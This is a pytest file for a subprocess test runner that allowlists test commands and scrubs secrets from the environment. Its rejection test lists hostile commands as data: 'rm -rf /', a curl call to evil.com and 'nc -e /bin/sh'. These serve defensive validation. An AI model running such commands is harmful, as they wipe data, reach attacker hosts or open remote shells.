"""Unit tests for subprocess test runner and secret isolation (Phase 3)."""

from __future__ import annotations

import os

import pytest

from tracefix.verification.test_runner import SubprocessTestRunner


def test_allowlisted_commands_pass_validation() -> None:
    runner = SubprocessTestRunner()
    runner.validate_command(["pytest", "-q"])
    runner.validate_command(["python", "-m", "unittest"])
    runner.validate_command(["pytest.exe", "tests/"])


@pytest.mark.parametrize(
    "prohibited_cmd",
    [
        ["bash", "-c", "echo hello"],
        ["powershell", "-Command", "Get-Process"],
        ["rm", "-rf", "/"],
        ["curl", "http://evil.com"],
        ["nc", "-e", "/bin/sh"],
    ],
)
def test_unallowlisted_commands_rejected(prohibited_cmd: list[str]) -> None:
    runner = SubprocessTestRunner()
    with pytest.raises(ValueError, match="Prohibited test executable"):
        runner.validate_command(prohibited_cmd)


def test_empty_command_rejected() -> None:
    runner = SubprocessTestRunner()
    with pytest.raises(ValueError, match="cannot be empty"):
        runner.validate_command([])


def test_secret_scrubbing_removes_sensitive_env() -> None:
    runner = SubprocessTestRunner(scrub_host_secrets=True)
    os.environ["MOCK_API_KEY"] = "super_secret_key"
    os.environ["MOCK_GITHUB_TOKEN"] = "ghp_1234567890"
    os.environ["AWS_SECRET_ACCESS_KEY"] = "aws_secret"
    os.environ["NORMAL_PATH"] = "C:\\Normal\\Path"

    try:
        clean_env = runner.build_clean_environment()
        assert "MOCK_API_KEY" not in clean_env
        assert "MOCK_GITHUB_TOKEN" not in clean_env
        assert "AWS_SECRET_ACCESS_KEY" not in clean_env
        assert "NORMAL_PATH" in clean_env
        assert clean_env["PYTHONDONTWRITEBYTECODE"] == "1"
    finally:
        os.environ.pop("MOCK_API_KEY", None)
        os.environ.pop("MOCK_GITHUB_TOKEN", None)
        os.environ.pop("AWS_SECRET_ACCESS_KEY", None)
        os.environ.pop("NORMAL_PATH", None)


def test_timeout_handling() -> None:
    runner = SubprocessTestRunner()
    # Run a python command that sleeps longer than timeout
    cmd = ["python", "-c", "import time; time.sleep(5)"]
    result = runner.run(cmd, cwd=".", timeout_seconds=1)
    assert result.timed_out
    assert result.exit_code == 124
